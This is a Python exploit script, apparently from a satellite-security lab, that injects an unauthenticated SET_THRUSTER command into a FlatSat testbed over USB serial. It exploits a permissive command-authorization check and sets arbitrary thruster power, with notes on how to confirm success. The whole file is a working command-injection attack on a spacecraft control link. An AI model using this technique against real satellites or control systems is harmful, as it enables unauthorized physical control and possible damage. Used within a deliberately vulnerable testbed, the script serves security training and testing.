#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 03_command_injection_usb.py -- unauthenticated SET_THRUSTER over the USB
# CDC serial link instead of RF. See 03_command_injection_rf.py for the full
# root-cause writeup (groundStationCommandAllowed() permissive by default).
#
# SET_THRUSTER transmits no downlink TM even on success, so this can't
# confirm the injection by listening -- confirm via the FlatSat's serial
# console ("Thruster N changed to: P") or PWNSAT-C3's Thruster gauge.

import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat_usb import FlatSatUSB  # noqa: E402


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--thruster-id", type=int, choices=[0, 1], default=0,
                        help="which thruster to command (0 or 1)")
    parser.add_argument("--power", type=int, default=200, metavar="0-255",
                        help="raw power value, no clamp on the firmware side")
    parser.add_argument("--seq", type=int, default=1, help="SPP sequence count")
    parser.add_argument("--encrypt", choices=["on", "off"], default="on")
    parser.add_argument("--port", default=None,
                        help="serial port for the USBRadioLink (default: autodetect)")
    parser.add_argument("--quiet", action="store_true")
    args = parser.parse_args()

    if not 0 <= args.power <= 255:
        parser.error("--power must be 0-255")

    print(f"[*] SET_THRUSTER: thruster_id={args.thruster_id} power={args.power} "
          f"-- no authentication required")

    with FlatSatUSB(port=args.port, encrypt=(args.encrypt == "on"),
                    verbose=not args.quiet) as fsat:
        fsat.send_tc("thruster", seq=args.seq, thruster_id=args.thruster_id,
                     power=args.power, listen_seconds=1.0)

    print(f"[+] Sent over USB. SET_THRUSTER never transmits a downlink TM -- "
          f"confirm via the FlatSat's own serial console "
          f"(\"Thruster {args.thruster_id} changed to: {args.power}\") "
          f"or PWNSAT-C3's Thruster gauge.")


if __name__ == "__main__":
    main()
